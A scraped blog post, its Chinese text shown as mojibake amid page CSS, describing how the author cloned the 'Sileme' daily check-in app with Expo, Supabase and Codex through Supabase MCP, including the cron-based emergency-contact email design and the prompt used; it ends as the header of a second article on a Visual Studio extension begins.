                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>è§†é¢‘é“¾æ¥ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1yEr4BJE8B%2F" target="_blank" title="https://www.bilibili.com/video/BV1yEr4BJE8B/" ref="nofollow noopener noreferrer">10åˆ†é’Ÿå¤åˆ»çˆ†ç«ã€Œæ­»äº†ä¹ˆã€Appï¼švibe coding å®æˆ˜</a></p>
<p>ä»“åº“åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fminorcell%2Fsileme-clone" target="_blank" title="https://github.com/minorcell/sileme-clone" ref="nofollow noopener noreferrer">github.com/minorcell/sâ€¦</a></p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b092795a9c6f46caa0b6dcaf8e8ca9ac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbUNlbGw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769020693&amp;x-signature=GAy6ygo99Walq4qbBoBGYZKq8AI%3D" alt="202602" loading="lazy"/></p>
<p>æœ€è¿‘â€œæ­»äº†ä¹ˆâ€App çªç„¶çˆ†ç«ï¼šå†…å®¹æç®€â€”â€”<strong>ç­¾åˆ°</strong> + <strong>æŠŠç´§æ€¥è”ç³»äººé‚®ç®±å¡«è¿›å»</strong>ã€‚
å®ƒçš„äº§å“å½¢æ€å¾ˆè½»ï¼Œä½†é—­ç¯å¾ˆå®Œæ•´ï¼š
ä½ æ¯å¤©æ‰“å¡å³å¯ï¼›å¦‚æœä½ è¿ç»­ä¸¤å¤©æ²¡æ‰“ï¼Œç³»ç»Ÿå°±ç»™ç´§æ€¥è”ç³»äººå‘é‚®ä»¶ã€‚</p>
<p>æ°å¥½æˆ‘æœ€è¿‘åœ¨åš Supabase ç›¸å…³è°ƒç ”ï¼Œå°±é¡ºæ‰‹æŠŠå®ƒå½“æˆä¸€æ¬¡â€œæé™éªŒè¯â€ï¼š</p>
<ul>
<li>æˆ‘æƒ³çœ‹çœ‹ï¼š<strong>Expo + Supabase</strong> èƒ½ä¸èƒ½æŠŠåç«¯å½»åº•â€œæŠ¹æ‰â€</li>
<li>æˆ‘ä¹Ÿæƒ³çœ‹çœ‹ï¼š<strong>Codex + MCP</strong> èƒ½ä¸èƒ½æŠŠâ€œå»ºè¡¨ / é…ç½® / å†™ä»£ç â€è¿™æ•´å¥—æµç¨‹è¿›ä¸€æ­¥å‹ç¼©</li>
<li>ä»¥åŠï¼švibe coding åˆ°åº•èƒ½ä¸èƒ½çœŸçš„åšåˆ°ï¼š<strong>è·‘èµ·æ¥ã€èƒ½ç”¨ã€é—­ç¯é€š</strong></li>
</ul>
<p>ç»“è®ºæ˜¯ï¼šèƒ½ã€‚å¹¶ä¸”æˆ‘å½•äº†å…¨è¿‡ç¨‹ï¼Œ<strong>ä»å»ºä»“åº“åˆ° App è·‘èµ·æ¥èƒ½ç”¨ï¼Œå…¨ç¨‹ 10 åˆ†é’Ÿ</strong>ã€‚</p>
<h2 data-id="heading-0">æˆ‘å¤åˆ»çš„ç›®æ ‡ï¼šåªä¿ç•™â€œæ ¸å¿ƒé—­ç¯â€</h2>
<p>æˆ‘æ²¡æ‰“ç®—åšä¸€ä¸ªå®Œæ•´äº§å“ï¼Œåªåšæœ€å°é—­ç¯ï¼š</p>
<ol>
<li><strong>ç”¨æˆ·æ³¨å†Œ / ç™»å½•</strong>ï¼ˆé‚®ç®± + å¯†ç  + é‚®ç®±éªŒè¯ç ï¼‰</li>
<li><strong>é¦–é¡µæ‰“å¡</strong>ï¼šæ¯å¤©åªèƒ½æ‰“ä¸€æ¬¡ï¼Œå±•ç¤ºâ€œè¿ç»­æ‰“å¡ xx å¤©â€</li>
<li><strong>æˆ‘çš„</strong>ï¼šæŸ¥çœ‹æ‰“å¡è®°å½• / è¿ç»­å¤©æ•°</li>
<li><strong>ç´§æ€¥è”ç³»äºº</strong>ï¼šè®¾ç½®ä¸€ä¸ªé‚®ç®±</li>
<li><strong>è¿ç»­ä¸¤å¤©æ²¡æ‰“å¡å°±å‘é‚®ä»¶</strong>ï¼ˆå®šæ—¶ä»»åŠ¡ + é‚®ä»¶å‘é€ï¼‰</li>
</ol>
<p>é¡µé¢é£æ ¼ï¼šç®€çº¦ã€æœ‰æ´»åŠ›ï¼ˆä½†ä¸è¿½æ±‚ UI ç»†èŠ‚ï¼‰ã€‚</p>
<h2 data-id="heading-1">æŠ€æœ¯æ ˆï¼šæŠŠâ€œåç«¯â€äº¤ç»™ Supabaseï¼ŒæŠŠâ€œä½“åŠ›æ´»â€äº¤ç»™ Agent</h2>
<ul>
<li><strong>å‰ç«¯</strong>ï¼šReact Native + Expoï¼ˆTypeScriptï¼‰</li>
<li><strong>åç«¯</strong>ï¼šSupabaseï¼ˆAuth + Postgres + RLSï¼‰</li>
<li><strong>è‡ªåŠ¨åŒ–</strong>ï¼šSupabase Cron + Edge Functions
Supabase çš„å®šæ—¶ä»»åŠ¡æœ¬è´¨æ˜¯ <code>pg_cron</code>ï¼Œå¯ä»¥è·‘ SQL / è°ƒå‡½æ•° / å‘ HTTP è¯·æ±‚ï¼ˆåŒ…æ‹¬è°ƒç”¨ Edge Functionï¼‰ã€‚(<a href="https://link.juejin.cn?target=https%3A%2F%2Fsupabase.com%2Fdocs%2Fguides%2Fcron%3Futm_source%3Dchatgpt.com" title="https://supabase.com/docs/guides/cron?utm_source=chatgpt.com" target="_blank" ref="nofollow noopener noreferrer">Supabase</a>)</li>
<li><strong>Agent</strong>ï¼šCodexï¼ˆé€šè¿‡ <strong>Supabase MCP</strong> ç›´æ¥è¿ Supabaseï¼‰
Supabase å®˜æ–¹æœ‰ MCP æŒ‡å—ï¼Œå¹¶ä¸”å¼ºè°ƒäº†å®‰å…¨æœ€ä½³å®è·µï¼ˆæ¯”å¦‚ scopeã€æƒé™ã€é¿å…è¯¯æ“ä½œï¼‰ã€‚(<a href="https://link.juejin.cn?target=https%3A%2F%2Fsupabase.com%2Fdocs%2Fguides%2Fgetting-started%2Fmcp%3Futm_source%3Dchatgpt.com" title="https://supabase.com/docs/guides/getting-started/mcp?utm_source=chatgpt.com" target="_blank" ref="nofollow noopener noreferrer">Supabase</a>)</li>
</ul>
<p>æˆ‘æ•´ä¸ªè¿‡ç¨‹çš„ä½“éªŒæ˜¯ï¼š</p>
<blockquote>
<p>ä»¥å‰ä½ è¦åœ¨â€œå‰ç«¯ / SQL / æ§åˆ¶å° / æ–‡æ¡£â€ä¹‹é—´æ¥å›åˆ‡ã€‚
ç°åœ¨ä½ åªéœ€è¦æŠŠéœ€æ±‚å†™æ¸…æ¥šï¼Œç„¶åç›¯ç€å®ƒå¹²æ´»ï¼Œå¶å°”æ¥ç®¡ä¸€ä¸‹å…³é”®é…ç½®ã€‚</p>
</blockquote>
<h2 data-id="heading-2">ä¸¤å¤©æ²¡æ‰“å¡å‘é‚®ä»¶ï¼šç”¨ Cron + Edge Functionï¼ŒæŠŠäº‹æƒ…åšå®Œ</h2>
<p>è¿™æ˜¯è¿™ä¸ª App æœ€å…³é”®çš„â€œé—­ç¯â€ã€‚</p>
<h3 data-id="heading-3">æ–¹æ¡ˆï¼šæ¯å¤©è·‘ä¸€æ¬¡å®šæ—¶ä»»åŠ¡</h3>
<ul>
<li><strong>Cron</strong>ï¼šæ¯å¤©å›ºå®šæ—¶é—´è·‘ï¼ˆæ¯”å¦‚ UTC 00:10ï¼‰</li>
<li><strong>ä»»åŠ¡å†…å®¹</strong>ï¼šæ‰¾å‡ºâ€œå·²ç»ä¸¤å¤©æ²¡æ‰“å¡â€çš„ç”¨æˆ·</li>
<li><strong>åŠ¨ä½œ</strong>ï¼šè°ƒç”¨ Edge Function å‘é‚®ä»¶</li>
</ul>
<p>Supabase å®˜æ–¹æ–‡æ¡£æ¨èçš„ç»„åˆæ˜¯ï¼š<code>pg_cron</code> + <code>pg_net</code>ï¼Œå®šæ—¶è°ƒç”¨ Edge Functionsã€‚(<a href="https://link.juejin.cn?target=https%3A%2F%2Fsupabase.com%2Fdocs%2Fguides%2Ffunctions%2Fschedule-functions%3Futm_source%3Dchatgpt.com" title="https://supabase.com/docs/guides/functions/schedule-functions?utm_source=chatgpt.com" target="_blank" ref="nofollow noopener noreferrer">Supabase</a>)</p>
<blockquote>
<p>ä½ ä¹Ÿå¯ä»¥ä¸è°ƒç”¨ Edge Functionï¼Œç›´æ¥è®© Cron å‘ HTTP webhook ç»™ä½ è‡ªå·±çš„æœåŠ¡ã€‚
ä½†æ—¢ç„¶ç›®æ ‡æ˜¯â€œä¸å†™åç«¯â€ï¼Œé‚£å°±è®© Edge Function å¤„ç†å°±è¡Œã€‚</p>
</blockquote>
<h3 data-id="heading-4">Edge Functionï¼šè´Ÿè´£â€œå‘é‚®ä»¶â€</h3>
<p>æ³¨æ„ï¼šSupabase Auth çš„é‚®ä»¶ï¼ˆéªŒè¯ç ï¼‰æ˜¯å®ƒè‡ªå·±çš„ç³»ç»Ÿé‚®ä»¶ï¼›
ä½ è¦ç»™ç´§æ€¥è”ç³»äººå‘æé†’ï¼Œé€šå¸¸éœ€è¦æ¥ç¬¬ä¸‰æ–¹é‚®ä»¶æœåŠ¡ï¼ˆResend / SendGrid / Mailgun / SES ä¹‹ç±»ï¼‰ã€‚</p>
<p>Supabase æ–‡æ¡£é‡Œä¹Ÿæåˆ°ï¼šå®šæ—¶è°ƒç”¨å‡½æ•°æ—¶ï¼Œæ•æ„Ÿ token å»ºè®®æ”¾åˆ° <strong>Supabase Vault</strong> é‡Œã€‚(<a href="https://link.juejin.cn?target=https%3A%2F%2Fsupabase.com%2Fdocs%2Fguides%2Ffunctions%2Fschedule-functions%3Futm_source%3Dchatgpt.com" title="https://supabase.com/docs/guides/functions/schedule-functions?utm_source=chatgpt.com" target="_blank" ref="nofollow noopener noreferrer">Supabase</a>)</p>
<p>Edge Functionï¼ˆä¼ªä»£ç ç¤ºæ„ï¼‰ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 1) æŸ¥æ•°æ®åº“ï¼šå“ªäº›äººè¶…è¿‡ 2 å¤©æ²¡æ‰“å¡</span>
<span class="hljs-comment">// 2) å–ç´§æ€¥è”ç³»äººé‚®ç®±</span>
<span class="hljs-comment">// 3) è°ƒç”¨é‚®ä»¶æœåŠ¡ API å‘é€æé†’</span>
</code></pre>
<p>Cron æ¯å¤©è·‘ä¸€æ¬¡å°±å¤Ÿäº†ï¼š
è¿™ä¸ªäº§å“çš„è¯­ä¹‰ä¸æ˜¯â€œç«‹åˆ»æŠ¥è­¦â€ï¼Œè€Œæ˜¯â€œè¿ç»­ä¸¤å¤©éƒ½æ²¡åŠ¨é™â€ã€‚</p>
<h2 data-id="heading-5">MCP + Codexï¼šæˆ‘è§‰å¾—æœ€çˆ½çš„åœ°æ–¹</h2>
<p>å¦‚æœä½ åªçœ‹ç»“æœï¼Œä½ ä¼šè§‰å¾—â€œè¿™ä¸å°±æ˜¯ä¸€ä¸ª CRUD App å—â€ã€‚</p>
<p>ä½†æˆ‘è§‰å¾—çœŸæ­£æœ‰æ„æ€çš„æ˜¯è¿‡ç¨‹ï¼š</p>
<ul>
<li>å®ƒä¸ä»…å†™å‰ç«¯ä»£ç </li>
<li>å®ƒè¿˜èƒ½â€œåƒä¸ªäººä¸€æ ·â€å»æŠŠ Supabase åå°çš„äº‹æƒ…åšæ‰ï¼šå»ºè¡¨ã€åŠ çº¦æŸã€å¼€ RLSã€å†™ç­–ç•¥ã€ç”šè‡³æç¤ºä½ å“ªé‡Œè¦æ‰‹åŠ¨è¡¥é…ç½®</li>
</ul>
<p>è€Œ Supabase MCP çš„å®˜æ–¹å®šä½ï¼Œå°±æ˜¯è®©æ¨¡å‹é€šè¿‡æ ‡å‡†åŒ–å·¥å…·å®‰å…¨åœ°æ“ä½œä½ çš„ Supabase é¡¹ç›®ï¼ˆå¹¶ä¸”å¼ºè°ƒå…ˆè¯»å®‰å…¨æœ€ä½³å®è·µï¼‰ã€‚(<a href="https://link.juejin.cn?target=https%3A%2F%2Fsupabase.com%2Fdocs%2Fguides%2Fgetting-started%2Fmcp%3Futm_source%3Dchatgpt.com" title="https://supabase.com/docs/guides/getting-started/mcp?utm_source=chatgpt.com" target="_blank" ref="nofollow noopener noreferrer">Supabase</a>)</p>
<p>æˆ‘è¿™æ¬¡å‡ ä¹æ²¡å†™ä»£ç ï¼Œæœ€å¤§çš„ç²¾åŠ›æ¶ˆè€—å…¶å®æ˜¯ä¸¤ä»¶äº‹ï¼š</p>
<ol>
<li><strong>æŠŠæç¤ºè¯å†™æ¸…æ¥š</strong>ï¼ˆå°¤å…¶æ˜¯â€œè§„åˆ™â€å’Œâ€œè¾¹ç•Œæ¡ä»¶â€ï¼‰</li>
<li><strong>å¯¹å…³é”®ç‚¹åšäººå·¥å¤æ ¸</strong>ï¼ˆRLSã€å”¯ä¸€çº¦æŸã€é‚®ä»¶é…ç½®ï¼‰</li>
</ol>
<h2 data-id="heading-6">æˆ‘ç°åœ¨ä¼šæ€ä¹ˆå†™æç¤ºè¯</h2>
<p>æˆ‘å‘ç° vibe coding æˆåŠŸç‡æœ€é«˜çš„æç¤ºè¯ï¼Œä¸insaneï¼Œåè€Œâ€œå•°å—¦â€ï¼š</p>
<ul>
<li>å…ˆå†™â€œæ¨¡å—å’Œæµç¨‹â€</li>
<li>å†å†™â€œæ•°æ®çº¦æŸâ€ï¼ˆæ¯å¤©åªèƒ½ä¸€æ¬¡ã€æ–­æ¡£æ€ä¹ˆå¤„ç†ï¼‰</li>
<li>å†å†™â€œå®‰å…¨ç­–ç•¥â€ï¼ˆRLS æ€ä¹ˆå¼€ï¼‰</li>
<li>æœ€åå†™â€œéªŒæ”¶æ ‡å‡†â€ï¼ˆåšåˆ°ä»€ä¹ˆç®—è·‘é€šï¼‰</li>
</ul>
<p>ä½ ç»™å¾—è¶Šå…·ä½“ï¼Œå®ƒè¶Šåƒä¸€ä¸ªé è°±åŒäº‹ï¼›
ä½ ç»™å¾—è¶Šæ¨¡ç³Šï¼Œå®ƒè¶Šå®¹æ˜“â€œè‡ªä½œä¸»å¼ â€ã€‚</p>
<h2 data-id="heading-7">é™„å½•</h2>
<h3 data-id="heading-8">æˆ‘è¿™æ¬¡ç”¨çš„æç¤ºè¯ï¼ˆåŸæ–‡ï¼‰</h3>
<pre><code class="hljs language-markdown" lang="markdown">éœ€æ±‚ï¼šä½¿ç”¨expoå’Œsupabaseå¼€å‘ä¸€ä¸ªç§»åŠ¨ç«¯APPï¼š æ­»äº†ä¹ˆ

<span class="hljs-section">## åŠŸèƒ½ï¼š</span>

<span class="hljs-section">### ç”¨æˆ·æ³¨å†Œï¼š</span>

<span class="hljs-bullet">1.</span> æè¿°ï¼šåœ¨appè¿›å…¥é¡µé¢ï¼Œç”¨æˆ·éœ€è¦è¾“å…¥é‚®ç®±å’Œå¯†ç ä»¥åŠç¡®è®¤å¯†ç ï¼Œè¿›è¡Œæ³¨å†Œã€‚
<span class="hljs-bullet">2.</span> æµç¨‹ï¼š
<span class="hljs-bullet">   -</span> ä½¿ç”¨supabaseçš„authè¿›è¡Œæ ¡éªŒï¼Œå‘é€éªŒè¯ç æ³¨å†Œé‚®ç®±åˆ°ç”¨æˆ·é‚®ç®±ï¼Œç”¨æˆ·éœ€è¦åœ¨é¡µé¢è¾“å…¥é‚®ç®±ä¸­çš„éªŒè¯ç ã€‚
<span class="hljs-bullet">   -</span> æ³¨å†ŒæˆåŠŸä¹‹åå³å¯è¿›å…¥appé¦–é¡µ

<span class="hljs-section">### é¦–é¡µæ‰“å¡ï¼š</span>

<span class="hljs-bullet">1.</span> æè¿°ï¼šç”¨æˆ·è¿›å…¥é¦–é¡µï¼Œåªæœ‰ä¸€ä¸ªå¤§å¤§çš„æ‰“å¡åŠŸèƒ½ï¼›â€œä»Šæ—¥æ´»ç€â€ï¼Œç‚¹å‡»å³å¯å®Œæˆæ‰“å¡åŠŸèƒ½
<span class="hljs-bullet">2.</span> æµç¨‹ï¼š
<span class="hljs-bullet">   -</span> supabaseéœ€è¦è®°å½•ç”¨æˆ·çš„æ‰“å¡ä¿¡æ¯
<span class="hljs-bullet">   -</span> æ‰“å¼€æˆåŠŸæ—¶ï¼Œæç¤ºç”¨æˆ·å·²ç»â€œä½ å·²è¿ç»­æ‰“å¡xxæ—¥ï¼Œåˆæ´»äº†ä¸€å¤©â€

<span class="hljs-section">### â€œæˆ‘çš„â€</span>

<span class="hljs-bullet">1.</span> ç”¨æˆ·å¯ä»¥åœ¨â€œæˆ‘çš„â€é¡µé¢æŸ¥çœ‹è‡ªå·±çš„æ‰“å¡è®°å½•ï¼Œè¿ç»­æ‰“å¡æ—¶é—´
<span class="hljs-bullet">2.</span> ç”¨æˆ·å¯ä»¥è®¾ç½®ç´§æ€¥è”ç³»äººï¼Œå½“æ£€æµ‹åˆ°ç”¨æˆ·è¿ç»­ä¸¤å¤©æ²¡æœ‰æ‰“å¡æ—¶ï¼Œä¼šå‘é€ä¸€å°ç´§æ€¥è”ç³»çš„é‚®ä»¶åˆ°ç´§æ€¥è”ç³»äººé‚®ç®±

<span class="hljs-section">## å…¶ä»–ï¼š</span>

<span class="hljs-bullet">1.</span> ç”¨æˆ·æ¯å¤©åªèƒ½æ‰“å¡ä¸€æ¬¡
<span class="hljs-bullet">2.</span> é¡µé¢ç®€çº¦ã€æœ‰æ´»åŠ›

<span class="hljs-quote">&gt; ä½ å¯ä»¥ä½¿ç”¨supabaseçš„mcpè¿›è¡Œæ‰€æœ‰çš„æ“ä½œï¼Œ</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸€ä¸ªè‡´åŠ›äºä¸º C# ç¨‹åºå‘˜æä¾›æ›´ä½³çš„ç¼–ç ä½“éªŒå’Œæ•ˆç‡çš„ Visual Studio æ‰©å±•æ’ä»¶]]></title>    <link>https://juejin.cn/post/7595029084284190774</link>    <guid>https://juejin.cn/post/7595029084284190774</guid>    <pubDate>2026-01-14T16:50:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595029084284190774" data-draft-id="7595033052796354601" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸€ä¸ªè‡´åŠ›äºä¸º C# ç¨‹åºå‘˜æä¾›æ›´ä½³çš„ç¼–ç ä½“éªŒå’Œæ•ˆç‡çš„ Visual Studio æ‰©å±•æ’ä»¶"/> <meta itemprop="keywords" content="åç«¯,C#,Visual Studio"/> <meta itemprop="datePublished" content="2026-01-14T16:50:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è¿½é€æ—¶å…‰è€…"/> <meta itemprop="url" content="https://juejin.cn/user/2770425031690333"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸€ä¸ªè‡´åŠ›äºä¸º C# ç¨‹åºå‘˜æä¾›æ›´ä½³çš„ç¼–ç ä½“éªŒå’Œæ•ˆç‡çš„ Visual Studio æ‰©å±•æ’ä»¶
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2770425031690333/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è¿½é€æ—¶å…‰è€…
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T16:50:16.000Z" title="Wed Jan 14 2026 16:50:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em 